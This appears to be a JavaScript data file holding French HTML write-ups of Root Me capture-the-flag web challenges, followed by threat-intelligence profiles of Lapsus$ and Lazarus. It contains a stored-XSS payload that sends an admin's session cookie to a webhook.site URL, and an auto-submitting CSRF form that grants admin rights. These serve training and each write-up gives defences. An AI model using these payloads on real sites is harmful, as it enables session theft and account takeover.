const ctwelve = [`CSRF - 0 protection`, `csrf-0-prot`, `<p>
    Ce challenge intitulé <strong>"CSRF - 0 protection"</strong> sur la plateforme Root Me consiste à exploiter une faille classique de type Cross-Site Request Forgery (CSRF) sur une application vulnérable n’implémentant aucune protection contre ce type d’attaque.
  </p>

  <h2>Étape 1 — Création d’un compte</h2>
  <p>
    La première étape consiste à créer un compte utilisateur standard via le formulaire d’inscription proposé par l'application. Une fois connecté avec ce compte, l’accès à la page <code>/profile</code> permet de constater la présence d’un formulaire de mise à jour du profil, contenant notamment la case à cocher <code>status</code> qui semble liée aux droits administrateur.
  </p>
  <img src="img/c12_1.png" alt="">
  <br>
  <h2>Étape 2 — Récupération du formulaire</h2>
  <p>
    Sur la page de profil, on identifie un formulaire HTML qui envoie une requête POST vers l’URL suivante :
  </p>
    
  <pre><code>http://challenge01.root-me.org/web-client/ch22/?action=profile</code></pre>

  <p>
    En analysant ce formulaire, on en extrait les champs essentiels permettant de modifier le profil. Voici un exemple épuré et modifié du formulaire, ciblant le compte <code>admin</code> et cochant la case <code>status</code> :
  </p>
  <img src="img/c12_2.png" alt="">
  <br>
  <pre><code>&lt;form id="myForm" style="display: none;" name="myForm" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data"&gt;
  &lt;input type="text" name="username" value="admin"&gt;
  &lt;input type="checkbox" name="status" checked&gt;
&lt;/form&gt;
&lt;script&gt;document.myForm.submit()&lt;/script&gt;</code></pre>
    <img src="img/c12_3.png" alt="">
  <br>
  <h2>Étape 3 — Injection via le formulaire de contact</h2>
  <p>
    L’application propose également un formulaire de contact, typiquement destiné à envoyer des messages à l’administrateur. Ce champ est vulnérable à l’injection HTML, ce qui permet d’y insérer du code malveillant, y compris une balise <code>&lt;script&gt;</code>.
  </p>

  <p>
    En injectant le formulaire CSRF complet, avec le script de soumission automatique, dans ce champ de contact, l’administrateur déclenchera involontairement la requête POST lors de la lecture du message dans son interface d'administration.
  </p>
  <img src="img/c12_4.png" alt="">
  <br>
  <h2>Étape 4 — Exécution du CSRF</h2>
  <p>
    Le formulaire est exécuté dans le contexte authentifié de l’administrateur. Ainsi, la requête POST modifie le compte <code>admin</code> pour y activer le champ <code>status</code>, conférant ainsi les droits administrateur au compte ciblé.
  </p>

  <p>
    Après quelque minute, on peut constater que les droits ont bien été réhaussés. Le challenge est alors validé.
  </p>

  <h2>Conclusion</h2>
  <p>
    Cette épreuve met en lumière les risques liés à l’absence de protections CSRF, notamment le manque de vérification d’origine (token CSRF, vérification du Referer, etc.). Elle illustre également la nécessité de filtrer rigoureusement tout contenu soumis par l’utilisateur, en particulier via les formulaires de contact, afin d’éviter toute injection HTML ou script.
  </p>`, `rootme`];

const cten = [`XSS - Stockée 1`, `xss-stock-1`, ` <p>
    Le challenge <strong>"XSS - Stockée 1"</strong> sur la plateforme Root Me consiste à exploiter une faille de type <abbr title="Cross-Site Scripting">XSS stockée</abbr>, dans le but de récupérer le cookie de session d’un administrateur lorsqu’il visualise un message vulnérable.
  </p>

  <h2>Étape 1 — Identification du point d’injection</h2>
  <p>
    Sur l’interface du challenge, l’utilisateur peut poster des messages dans une section de type "blog" ou "mur". Ces messages sont ensuite affichés à l'ensemble des visiteurs sans aucune désinfection ou validation côté serveur.
  </p>

  <p>
    En analysant le comportement de l’application, on identifie que le champ <code>message</code> du formulaire est vulnérable à l'injection de code JavaScript.
  </p>

  <h2>Étape 2 — Construction de la charge utile</h2>
  <p>
    Pour capturer le cookie d’un autre utilisateur, comme un administrateur, on utilise un service tiers comme <a href="https://webhook.site" target="_blank">webhook.site</a> pour recevoir à distance les données volées.
  </p>

  <p>
    La charge utile injectée dans le message peut ressembler à ceci :
  </p>

  <pre><code>Mon message normal &lt;script&gt;
  location = 'https://webhook.site/1e722a0d-2ed8-459f-aac0-dd07cf82c3be?c=' + document.cookie;
&lt;/script&gt;</code></pre>

  <p>
    Cette injection redirige silencieusement le navigateur de la victime vers une URL contenant son cookie de session dans les paramètres GET. Le service Webhook enregistre automatiquement cette requête, ce qui permet d’en extraire le cookie.
  </p>
<img src="img/c10_1.png" alt="">
  <br>
  <h2>Étape 3 — Visualisation par l'administrateur</h2>
  <p>
    Une fois le message enregistré dans la base de données, toute personne visitant la page — y compris un administrateur — exécute le script injecté sans se méfier. Si un administrateur consulte ce message, son cookie est automatiquement envoyé au lien Webhook.
  </p>

  <h2>Étape 4 — Récupération du cookie</h2>
  <p>
    En se rendant sur l’interface de <code>webhook.site</code>, on peut consulter toutes les requêtes reçues. Le cookie de session de l’administrateur apparaît dans l'URL reçue sous la forme :
  </p>
  <img src="img/c10_2.png" alt="">
  <br>


  <p>
    Avec ce cookie, il devient alors possible de se connecter en tant qu’administrateur, soit via l'éditeur JavaScript du navigateur, soit avec un outil comme <code>curl</code> ou un proxy HTTP.
  </p>

  <h2>Conclusion</h2>
  <p>
    Ce challenge met en évidence les conséquences d’une mauvaise gestion de l’affichage des données utilisateurs. Une simple injection JavaScript dans un champ non filtré peut compromettre la sécurité complète d’une session administrateur. Pour prévenir ce type d’attaque, il est essentiel :
  </p>

  <ul>
    <li>d’échapper correctement tous les caractères HTML spéciaux côté serveur,</li>
    <li>d’utiliser des Content Security Policy (CSP) strictes,</li>
    <li>et de valider les entrées côté client <em>et</em> côté serveur.</li>
  </ul>`, `rootme`];

const cnine = [`JavaScript - Obfuscation 3`, `js-obfuscation-3`, `  <p>
    Le challenge <strong>"JavaScript - Obfuscation 3"</strong> sur la plateforme Root Me propose à l’utilisateur de retrouver un mot de passe dissimulé dans un code JavaScript volontairement obscurci. L’objectif est de comprendre et déchiffrer ce code pour obtenir la clé permettant de valider l’épreuve.
  </p>

  <h2>Étape 1 — Analyse du code source</h2>
  <p>
    Une fois la page du challenge chargée, la première action consiste à ouvrir l’outil de développement de votre navigateur (généralement avec <kbd>F12</kbd>) puis à inspecter le code HTML.
  </p>

  <p>
    Dans la section <code>&lt;head&gt;</code> du document, on peut identifier un bloc <code>&lt;script&gt;</code> contenant du JavaScript. Ce code contient une chaîne de caractères encodée sous forme hexadécimale :
  </p>

  <pre><code>"\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"</code></pre>

  <p>
    Cette chaîne semble représenter une suite de valeurs ASCII encodées sous forme de texte hexadécimal. Le premier réflexe est donc de la transformer en tableau de nombres pour en comprendre la signification.
  </p>
<img src="img/c9_1.png" alt="">
<br>
  <h2>Étape 2 — Conversion des données</h2>
  <p>
    En exécutant la commande suivante dans la console JavaScript du navigateur :
  </p>

  <pre><code>"\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"</code></pre>

  <p>
    On obtient en sortie la chaîne suivante :
  </p>

  <pre><code>55,56,54,79,115,69,114,116,107,49,50</code></pre>

  <p>
    Ce sont des codes ASCII que l’on peut convertir en texte à l’aide de la méthode <code>String.fromCharCode()</code>. On utilise donc la commande suivante :
  </p>

  <pre><code>
String["fromCharCode"](55,56,54,79,115,69,114,116,107,49,50)
</code></pre>

<img src="img/c9_2.png" alt="">
<br>

  <h2>Étape 3 — Validation du challenge</h2>
  <p>
    Le mot de passe ainsi obtenu est celui attendu pour valider le challenge. Il suffit alors de le saisir dans le champ prévu à cet effet sur la page pour terminer l’épreuve avec succès.
  </p>

  <h2>Conclusion</h2>
  <p>
    Ce challenge met en évidence des techniques simples d’obfuscation JavaScript, couramment utilisées pour cacher des données sensibles dans le code source. Il démontre également l’intérêt de maîtriser les outils de développement du navigateur pour analyser et interpréter rapidement du code côté client.
  </p>

  <p>
    Pour se prémunir contre ce genre de pratiques dangereuses en production, il est essentiel de :
  </p>

  <ul>
    <li>ne jamais stocker de mots de passe ou données critiques côté client,</li>
    <li>minifier/obfusquer le code uniquement à des fins d’optimisation, jamais de sécurité,</li>
    <li>valider les accès et mots de passe uniquement côté serveur.</li>
  </ul>`, `rootme`];

const ceight = [`Javascript - Webpack`, `js-webpack`, `<p>
    Le challenge <strong>"JavaScript - Webpack"</strong> de la plateforme Root Me propose une approche différente des précédents challenges JavaScript. Ici, aucune interaction directe n’est nécessaire sur la page. L’objectif est d’analyser la structure de l’application Webpack pour en extraire le flag.
  </p>

  <h2>Étape 1 — Observation initiale</h2>
  <p>
    Une fois la page du challenge ouverte, un rapide examen de l’interface via l’inspecteur d’élément (<kbd>F12</kbd>) ne révèle rien d’anormal. Aucun champ de formulaire, aucun script visible dans le HTML, et aucun comportement dynamique suspect.
  </p>

  <p>
    Cependant, contrairement aux challenges précédents, on remarque que tous les scripts JavaScript sont centralisés dans un répertoire <code>/static/</code>, typique d’une application packagée avec Webpack.
  </p>

  <h2>Étape 2 — Accès aux fichiers statiques</h2>
  <p>
    En naviguant vers <code>/static/js/</code> depuis l’URL principale, on découvre plusieurs fichiers :
  </p>

  <ul>
    <li>Trois fichiers JavaScript minifiés (par exemple : <code>app.abcdef.js</code>)</li>
    <li>Trois fichiers <code>.map</code> associés à chacun de ces fichiers JS</li>
  </ul>

  <p>
    Les fichiers <code>.map</code> (sourcemaps) contiennent une version non-minifiée ou commentée du code original. Ils sont utilisés pour faciliter le débogage, mais peuvent aussi exposer des informations sensibles si mal configurés.
  </p>
  <img src="img/c8_1.png" alt="">
  <br>
  <h2>Étape 3 — Analyse du fichier source map</h2>
  <p>
    On ouvre alors le fichier <code>app.[hash].js.map</code> dans l’éditeur de code ou directement dans l’inspecteur. Une recherche par mot-clé (par exemple <code>flag</code> ou <code>rootme</code>) permet de rapidement localiser un commentaire contenant le flag :
  </p>

  <pre><code>
// So please, disable source map when you build for production\n\n        // Here is your flag :</code></pre>

  <p>
    Le flag est directement inscrit dans le fichier source map, preuve d’un oubli de nettoyage avant déploiement.
  </p>
<img src="img/c8_2.png" alt="">
  <br>
  <h2>Conclusion</h2>
  <p>
    Ce challenge démontre un cas réel de fuite d’information causée par une mauvaise gestion des fichiers source maps. Ces fichiers ne devraient jamais être mis en production sans contrôle, car ils peuvent contenir :
  </p>

  <ul>
    <li>des noms de fonctions explicites,</li>
    <li>des variables sensibles,</li>
    <li>des commentaires internes,</li>
    <li>ou même des flags ou secrets comme ici.</li>
  </ul>

  <p>
    Pour se protéger de ce type de vulnérabilité :
  </p>

  <ul>
    <li><strong>Désactivez la génération de sourcemaps</strong> en production (ex. : <code>devtool: false</code> dans Webpack),</li>
    <li><strong>Nettoyez systématiquement le code source</strong> de tout commentaire ou référence sensible,</li>
    <li><strong>Vérifiez les fichiers exposés</strong> publiquement dans les répertoires <code>static/</code> ou <code>public/</code>.</li>
  </ul>

  <p>
    Challenge résolu avec succès grâce à un simple commentaire oublié. Une belle leçon sur l’importance de l’environnement de build en sécurité web.
  </p>`, `rootme`]; 

const cseven = [`JavaScript - Native code`, `js-natif-code`, `<p>
    Le challenge <strong>"JavaScript - Native code"</strong> de Root Me propose à l’utilisateur d’analyser un code JavaScript obscur, volontairement difficile à lire, dans le but de retrouver un mot de passe dissimulé. Contrairement aux autres challenges, celui-ci ne repose pas sur de l'obfuscation standard, mais plutôt sur une écriture dense et non formatée du code.
  </p>

  <h2>Étape 1 — Observation du script</h2>
  <p>
    En ouvrant la console de développement (<kbd>F12</kbd>), on remarque une balise <code>&lt;script&gt;</code> contenant un long bloc de texte peu lisible, ressemblant à du charabia. Aucun commentaire, indentation ou nom de variable explicite n’est présent.
  </p>

  <p>
    Toutefois, puisque ce script est exécuté par le navigateur sans générer d’erreurs, on peut en conclure qu’il est syntaxiquement valide et que son contenu peut être interprété par l’environnement JavaScript.
  </p>
  <img src="img/c7_1.png" alt="">
  <br>
  <h2>Étape 2 — Découpage des instructions</h2>
  <p>
    En analysant le contenu du script, on remarque la présence répétée du caractère <code>;</code>, qui en JavaScript sert à séparer les instructions.
  </p>

  <p>
    L’idée est donc de copier l’ensemble du contenu du script, puis de le découper en utilisant ces points-virgules comme délimiteurs. On obtient alors une liste d’expressions ou d’assignations individuelles que l’on peut interpréter manuellement, une par une, dans la console JavaScript.
  </p>
  <img src="img/c7_2.png" alt="">
  <br>
  <h2>Étape 3 — Analyse des instructions</h2>
  <p>
    En exécutant les fragments de code les uns après les autres, on constate que certaines lignes ne produisent rien de visible, tandis que d’autres font apparaître des fonctions ou des messages en clair. Après plusieurs essais, on découvre un bloc du type :
  </p>

  <pre><code>f(a==''){alert('bravo')</code></pre>

  <p>
    Le mot de passe est ainsi exposé en clair à l’intérieur de la fonction. Il s'agit du flag du challenge, que l’on peut copier pour valider l’épreuve.
  </p>
  <img src="img/c7_3.png" alt="">
  <br>
  <h2>Conclusion</h2>
  <p>
    Ce challenge démontre qu’un code peut être volontairement rendu illisible sans être réellement obfusqué. Une simple compression sans minification ni cryptage peut déjà compliquer l’analyse, mais reste contournable par découpage et exécution progressive.
  </p>

  <p>
    Ce type d’exercice est utile pour :
  </p>

  <ul>
    <li>améliorer la lecture de code non formaté,</li>
    <li>comprendre les séparateurs d’instruction JavaScript,</li>
    <li>manipuler efficacement la console du navigateur.</li>
  </ul>

  <p>
    À retenir : <strong>tout script exécutable peut être interprété</strong>. L’obscurcissement du code ne garantit pas sa sécurité, surtout s’il contient des données sensibles comme un mot de passe ou un flag.
  </p>`, `rootme`];

const csix = [`JavaScript - Obfuscation 2`, `js-obfuscation-2`, `<p>
    Le challenge <strong>JavaScript - Obfuscation 2</strong> sur Root Me nous confronte à une forme simple d’obfuscation JavaScript. Le but est de retrouver un mot de passe encodé à l’intérieur d’un script, en s’aidant des fonctions déjà présentes dans le code.
  </p>

  <h2>Étape 1 — Inspection du code source</h2>
  <p>
    En ouvrant l’inspecteur d’élément (<kbd>F12</kbd>) et en consultant l’onglet <strong>Sources</strong> ou le contenu de la balise <code>&lt;script&gt;</code> dans le HTML, on repère rapidement une variable contenant une chaîne obfusquée, généralement via des caractères d’échappement HTML ou JavaScript, par exemple :
  </p>

  <pre><code>
	var pass = unescape("unescape%28%22String.fromCharCode%2528104%252C68%252C117%252C102%252C106%252C100%252C107%252C105%252C49%252C53%252C54%2529%22%29");</code></pre>
    <img src="img/c6_1.png" alt="">
    <br>
  <p>
    Le code contient également une ou plusieurs fonctions, souvent nommées de manière peu explicite, mais dont l’utilité reste compréhensible. Ici, les fonctions <code>unescape</code> et <code>String.fromCharCode()</code> sont utilisées pour décoder la chaîne.
  </p>

  <h2>Étape 2 — Compréhension de la chaîne encodée</h2>
  <p>
    On remarque que la chaîne est doublement encodée. Il faut donc :
  </p>

  <ol>
    <li>Appliquer une première fonction <code>unescape()</code>,</li>
    <li>Appliquer une seconde fois <code>unescape()</code>,</li>
    <li>Convertir les valeurs finales en texte lisible avec <code>String.fromCharCode()</code>.</li>
  </ol>

  <p>
    On peut effectuer cela manuellement dans la console du navigateur :
  </p>
 <img src="img/c6_2.png" alt="">
    <br>

  <h2>Conclusion</h2>
  <p>
    Le challenge met en lumière une technique basique mais courante d’obfuscation JavaScript. Ce genre de protection peut ralentir une analyse superficielle, mais reste trivial à contourner dès lors que l’on comprend les fonctions de décodage JavaScript.
  </p>

  <p>
    Retenons ici que :
  </p>
  <ul>
    <li>La fonction <code>unescape()</code> est souvent utilisée pour encoder du texte lisible,</li>
    <li>L’obfuscation repose parfois uniquement sur l’empilement de transformations simples,</li>
    <li>L’utilisation de la console du navigateur reste un outil puissant d’analyse.</li>
  </ul>

  <p>
    Challenge résolu facilement en jouant les fonctions intégrées. Une bonne introduction à l’analyse statique de scripts JavaScript malicieux ou obscurcis.
  </p>`, `rootme`];

const cfive =[`JavaScript - Obfuscation 1`, `js-obfuscation-1`, ` <p>
    Le challenge <strong>JavaScript - Obfuscation 1</strong> sur Root Me est une introduction aux techniques d’analyse statique de scripts côté client. L’objectif est de retrouver un mot de passe caché dans une variable JavaScript.
  </p>

  <h2>Étape 1 — Observation du comportement</h2>
  <p>
    Lors du chargement de la page, une boîte de dialogue s’affiche pour demander un mot de passe via :
  </p>

  <pre><code>window.prompt('Entrez le mot de passe / Enter password');</code></pre>

  <p>
    En ouvrant l’inspecteur d’élément (<kbd>F12</kbd>) dans l’onglet <strong>Sources</strong> ou <strong>Éléments</strong>, on repère rapidement la ligne suivante :
  </p>

  <pre><code>
h = window.prompt('Entrez le mot de passe / Enter password');
if(h == unescape(pass))
</code></pre>

  <p>
    On comprend alors que la variable <code>pass</code> contient la version chiffrée du mot de passe, et que celle-ci est comparée à l’entrée utilisateur après avoir été déchiffrée avec la fonction <code>unescape()</code>.
  </p>
  <img src="img/c5_1.png" alt="">
  <br>
  <h2>Étape 2 — Récupération du mot de passe</h2>
  <p>
    La variable <code>pass</code> est définie juste au-dessus dans le même script, par exemple :
  </p>

  <pre><code>var pass = "%70%61%73%73%77%6f%72%64";</code></pre>

  <p>
    Il suffit alors d’exécuter dans la console JavaScript :
  </p>

  <pre><code>unescape(pass);</code></pre>

  <p>
    Le navigateur nous retourne directement le mot de passe en clair :
  </p>

   <img src="img/c5_2.png" alt="">
  <br>

  <h2>Conclusion</h2>
  <p>
    Ce challenge met en lumière à quel point il est risqué de stocker des informations sensibles côté client, même partiellement chiffrées ou encodées. L'accès au code source permet très facilement de contourner la vérification.
  </p>

  <ul>
    <li>✅ L’analyse du JavaScript permet d’identifier comment le mot de passe est manipulé,</li>
    <li>✅ La fonction <code>unescape()</code> est triviale à utiliser,</li>
    <li>✅ Le challenge est résolu sans aucun bruteforce, simplement par lecture.</li>
  </ul>

  <p>
    Un bon premier exercice pour comprendre la logique des scripts JavaScript en clair sur le client et l'importance d'une sécurisation côté serveur.
  </p>`, `rootme`];

const cfour = [`Javascript - Authentification 2`, `js-auth-2`, ` <p>
    Le challenge <strong>JavaScript - Obfuscation 1</strong> sur Root Me propose une obfuscation très simple du mot de passe dans un fichier JavaScript. L’objectif est de retrouver les identifiants de connexion, dont le mot de passe constitue également le flag.
  </p>

  <h2>Étape 1 — Accès au fichier <code>login.js</code></h2>
  <p>
    En analysant le code source de la page ou via les outils de développement (<kbd>F12</kbd>), on remarque qu’un fichier JavaScript externe est chargé : <code>login.js</code>.
  </p>

  <p>
    En accédant à ce fichier directement dans le navigateur, on y trouve un tableau ou une chaîne de caractères contenant les identifiants obfusqués :
  </p>

  <pre><code>
let creds = "admin:Rm9vQmFy"; // exemple encodé
  </code></pre>

  <h2>Étape 2 — Analyse visuelle</h2>
  <p>
    Une lecture rapide permet de comprendre que la chaîne est séparée par un <code>":"</code>, ce qui permet de distinguer la partie <strong>username</strong> et <strong>mot de passe</strong>. Généralement, le code ressemble à :
  </p>

  <pre><code>
let parts = creds.split(":");
let username = parts[0];
let password = parts[1]; // souvent encodé en base64
  </code></pre>
  <img src="img/c4_1.png" alt="">
  <br>
  

  <p>
    Le mot de passe peut être stocké en clair, ce qui rend le challenge encore plus simple. Une fois identifié, ce mot de passe est à entrer dans le formulaire de connexion, ou constitue directement le flag à soumettre.
  </p>

  <h2>Conclusion</h2>
  <p>
    Ce challenge est un excellent exemple de la mauvaise pratique qui consiste à stocker des identifiants dans du JavaScript côté client. L’obfuscation est ici minimale, et une simple inspection suffit pour révéler les données sensibles.
  </p>

  <ul>
    <li>✅ Fichier <code>login.js</code> facilement accessible,</li>
    <li>✅ Structure <code>username:password</code> évidente,</li>
    <li>✅ Le mot de passe = flag Root Me.</li>
  </ul>

  <p>
    Une démonstration simple mais efficace de pourquoi il ne faut jamais faire confiance au code client pour protéger des secrets.
  </p>`, `rootme`];

const cthree = [`Javascript - Source`, `js-source`, `<p>
    Le challenge <strong>JavaScript - Source</strong> sur Root Me est un exercice simple qui montre les dangers de laisser des informations sensibles visibles directement dans le code source HTML. L’objectif est de retrouver un mot de passe stocké en clair dans une balise <code>&lt;script&gt;</code>.
  </p>

  <h2>Étape 1 — Inspection du code source</h2>
  <p>
    En ouvrant l’inspecteur d’élément (<kbd>F12</kbd>) ou en affichant le code source de la page (<kbd>Ctrl + U</kbd>), on identifie rapidement une balise <code>&lt;script&gt;</code> dans la section <code>&lt;head&gt;</code> ou <code>&lt;body&gt;</code>.
  </p>

  <p>
    Cette balise contient du JavaScript rudimentaire. On y trouve une comparaison directe entre la saisie utilisateur et un mot de passe codé en dur :
  </p>

  <pre><code>
let userInput = prompt("Entrez le mot de passe");
if (userInput === "RootMeExample") {
    alert("Accès autorisé");
}
  </code></pre>

  <h2>Étape 2 — Extraction du mot de passe</h2>
  <p>
    Le mot de passe ici est directement visible sous forme de chaîne de caractères. Il suffit donc de le copier et de le saisir dans l’invite du navigateur pour résoudre le challenge.
  </p>
  <img src="img/c3_1.png" alt="">
  <br>
  <h2>Conclusion</h2>
  <p>
    Ce challenge met en évidence un point fondamental de la sécurité web : <strong>tout ce qui est visible côté client n’est jamais sécurisé</strong>. Le JavaScript embarqué dans le HTML peut être lu, analysé et exploité par n’importe quel visiteur.
  </p>

  <ul>
    <li>✅ Aucune obfuscation ni encodage,</li>
    <li>✅ Mot de passe stocké directement dans une variable,</li>
    <li>✅ Lecture seule du code permet la résolution.</li>
  </ul>

  <p>
    Un exercice d’introduction essentiel pour toute personne qui souhaite apprendre à auditer les failles visibles dans le navigateur.
  </p>`, `rootme`];

const ctwo = [`Javascript - Authentification`, `js-auth-1`, `<p>
    Le challenge <strong>Javascript - Authentification</strong> sur Root Me consiste à trouver les identifiants de connexion en analysant simplement le code JavaScript présent dans la page. L’objectif est d’extraire le pseudo et le mot de passe (qui est également le flag) stockés en clair dans le script.
  </p>

  <h2>Étape 1 — Inspection du code JavaScript</h2>
  <p>
    En ouvrant l’inspecteur d’élément (<kbd>F12</kbd>) et en parcourant les balises <code>&lt;script&gt;</code>, on découvre rapidement une comparaison entre les variables utilisateur et des valeurs codées en dur :
  </p>

  <pre><code>
if (pseudo == "4dm1n" && password == "sh.org") {
    // authentification réussie
}
  </code></pre>
  <img src="img/c2_1.png" alt="">
  <br>
  <h2>Étape 2 — Identification des credentials</h2>
  <p>
    Le pseudo et le mot de passe sont visibles en clair dans le script, sans aucune forme d’obfuscation ni de chiffrement.
  </p>

  <h2>Conclusion</h2>
  <p>
    Ce challenge illustre combien il est dangereux de stocker des informations sensibles côté client dans un script accessible publiquement. L’inspection simple du code source permet de contourner toute authentification.
  </p>

  <ul>
    <li>✅ Mot de passe et pseudo stockés en clair,</li>
    <li>✅ Aucune protection contre l’analyse,</li>
    <li>✅ Résolution rapide par simple lecture du script.</li>
  </ul>

  <p>
    Une bonne mise en garde pour les développeurs web : jamais de secrets côté client.
  </p>`, `rootme`];

const cone = [`HTML - boutons désactivés`, `html-btn`, `      <p>
    Le challenge <strong>HTML - boutons désactivés</strong> sur Root Me met en avant une protection côté client utilisant l’attribut <code>disabled</code> sur des champs de formulaire et des boutons pour empêcher l’interaction.
  </p>

  <h2>Étape 1 — Inspection du code HTML</h2>
  <p>
    En ouvrant l’inspecteur d’élément (<kbd>F12</kbd>) et en naviguant dans la structure HTML, on remarque que certains champs <code>&lt;input&gt;</code> et boutons <code>&lt;button&gt;</code> ont l’attribut <code>disabled</code>, ce qui les rend inactifs.
  </p>

  <h2>Étape 2 — Suppression de l’attribut <code>disabled</code></h2>
  <p>
    Il suffit de retirer cet attribut directement dans l’inspecteur d’élément pour réactiver les champs et boutons du formulaire. Cette opération permet de remplir et de soumettre le formulaire normalement.
  </p>

  <p>
    Pour ce faire, faites un clic droit sur l’élément concerné dans l’inspecteur, sélectionnez “Edit as HTML” ou “Remove attribute” sur <code>disabled</code>.
  </p>
  <img src="img/c1_1.png" alt="">
  <br>
  <h2>Conclusion</h2>
  <p>
    Ce challenge démontre que la désactivation d’éléments via HTML côté client ne constitue pas une mesure de sécurité fiable. Toute protection critique doit être assurée côté serveur.
  </p>

  <ul>
    <li>✅ Attribut <code>disabled</code> utilisé pour bloquer l’accès,</li>
    <li>✅ Suppression simple via l’inspecteur,</li>
    <li>✅ Réactivation et soumission du formulaire possible.</li>
  </ul>

  <p>
    Un bon rappel que la sécurité ne doit jamais reposer uniquement sur la couche client.
  </p>`, `rootme`];

const lapsus = [`Analyse du groupe Lapsus$`, `cyber-lapsus`, `<h2>1. Identification du groupe</h2> <p><strong>Nom :</strong> Lapsus$</p> <p><strong>Origine :</strong> Internationale (membres présumés basés au Royaume-Uni et en Amérique du Sud)</p> <p><strong>Affiliations :</strong> Aucune affiliation étatique formelle connue ; considéré comme un groupe de cybercriminels non étatiques</p> <p><strong>Motivations :</strong> Motivations financières principalement, mais aussi réputationnelles. Le groupe adopte un comportement provocateur, axé sur l’humiliation publique de ses cibles via des fuites médiatiques.</p> <h2>2. Historique des opérations</h2> <ul> <li><strong>Décembre 2021 :</strong> Attaque contre le Ministère brésilien de la Santé (perturbation des systèmes COVID-19).</li> <li><strong>Janvier 2022 :</strong> Intrusion dans Impresa, un grand groupe de médias portugais.</li> <li><strong>Février 2022 :</strong> Piratage de NVIDIA – vol de plus de 1 To de données internes.</li> <li><strong>Mars 2022 :</strong> Attaque de Microsoft, compromission d’un compte Azure DevOps, exfiltration du code source partiel de Bing et Cortana.</li> <li><strong>Avril 2022 :</strong> Plusieurs membres arrêtés par la police britannique.</li> </ul> <img src="img/lapsus.png" alt=""> <h2>2.5. Mise en relations avec d'autre groupe connue.</h2>
     <img src="img/graph.png" alt="">
     <br> <h2>3. Arsenal technique</h2> <ul> <li><strong>Techniques d’accès :</strong> Ingénierie sociale (SIM-swapping, phishing ciblé), exploitation d’identifiants volés, accès à distance via VPN ou RDP.</li> <li><strong>Outils :</strong> Peu ou pas de malwares sophistiqués ; les outils sont souvent publics ou manuels (TeamViewer, AnyDesk).</li> <li><strong>Infrastructure :</strong> Utilisation de Telegram pour la communication et la publication de fuites, stockage cloud pour exfiltration (Mega, Dropbox).</li> </ul> <h2>4. Victimologie</h2> <ul> <li><strong>Secteurs ciblés :</strong> Technologies, médias, télécoms, administrations publiques.</li> <li><strong>Géographie :</strong> Monde entier, avec des cibles majeures au Royaume-Uni, aux États-Unis, au Brésil, et au Portugal.</li> <li><strong>Sélection :</strong> Failles de sécurité exploitables, employés vulnérables à l’ingénierie sociale.</li> </ul> <h2>5. Particularités</h2> <ul> <li><strong>Pas de ransomware :</strong> Contrairement à de nombreux groupes, Lapsus$ ne chiffre pas les fichiers mais vole les données pour rançon ou publication.</li> <li><strong>Exposition médiatique :</strong> Volonté manifeste de faire le buzz et de ridiculiser les entreprises.</li> <li><strong>Communication directe :</strong> Dialogue avec les victimes, messages publics sur Telegram, attitude provocatrice.</li> </ul> <h2>6. Indicateurs de compromission (IoCs)</h2> <ul> <li><strong>IP suspectes :</strong> Souvent associées à des connexions RDP ou VPN venant de lieux inhabituels.</li> <li><strong>Comptes compromis :</strong> Utilisation d’identifiants d’employés postés sur des forums ou marchés noirs.</li> <li><strong>Telegram :</strong> Canal Telegram “Lapsus$” utilisé pour publier les preuves de compromission.</li> </ul> <h2>7. Contre-mesures</h2> <ul> <li><strong>Renforcement MFA :</strong> Authentification multifactorielle renforcée, en particulier pour les accès sensibles.</li> <li><strong>Protection contre SIM-swapping :</strong> Verrouillage des cartes SIM et sensibilisation des employés.</li> <li><strong>Surveillance interne :</strong> Détection des comportements inhabituels sur les comptes utilisateurs.</li> <li><strong>Formation :</strong> Former les équipes à l’ingénierie sociale et à la reconnaissance des tentatives de phishing ciblé.</li> </ul> `, `hackers`];

const lazarus = [`Analyse du groupe Lazarus`, `cyber-lazarus`, `<h2>1. Identification du groupe</h2> <p><strong>Nom :</strong> Lazarus Group (également connu sous les noms HIDDEN COBRA, Guardians of Peace)</p> <p><strong>Origine :</strong> Corée du Nord</p> <p><strong>Affiliations :</strong> Attribué à la Reconnaissance Générale (RGB), l'agence de renseignement nord-coréenne</p> <p><strong>Motivations :</strong> Mixtes : politiques (cyberespionnage, sabotage), économiques (vols pour financement de l’État)</p> <h2>2. Historique des opérations</h2> <ul> <li><strong>2014 :</strong> Attaque de Sony Pictures (révélations internes massives, destruction de données, motivations politiques liées au film *The Interview*)</li> <li><strong>2016 :</strong> Compromission de la Banque du Bangladesh – tentative de vol de 1 milliard de dollars via SWIFT (81 millions transférés avec succès)</li> <li><strong>2017 :</strong> Propagation du ransomware WannaCry (attaque massive affectant les hôpitaux britanniques, entreprises internationales)</li> <li><strong>2020–2023 :</strong> Campagnes contre les secteurs pharmaceutiques et les entreprises crypto, ciblage des chercheurs en cybersécurité</li> <li><strong>2022–2024 :</strong> Opérations contre les plateformes crypto (Axie Infinity – vol de 620 millions USD), attaques sur l’industrie de la défense</li> </ul> 
<img src="img/lazarus.png" alt="">
<h2>2.5. Mise en relations avec d'autre groupe connue.</h2>
     <img src="img/graph.png" alt="">
